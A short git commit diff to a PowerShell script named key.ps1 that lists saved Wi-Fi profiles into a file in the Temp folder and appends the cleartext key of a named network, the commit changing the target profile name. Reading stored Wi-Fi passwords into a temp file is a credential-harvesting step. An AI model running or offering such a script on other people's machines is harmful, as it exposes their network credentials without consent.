dcfeda19df383f1bf5f5b5c41db450e9747d4023
DennisMejicanos <dennis.mejicanos@galileo.edu>
2019-10-26 00:52:31 -0600

    Update key.ps1

--- key.ps1
+++ key.ps1
@@ -1,4 +1,3 @@
 cd AppData\Local\Temp
 netsh wlan show profile > key.txt
-netsh wlan show profile name=CASA key=clear >> key.txt
-cd
+netsh wlan show profile name=FAMILIA_MEJICANOS key=clear >> key.txt
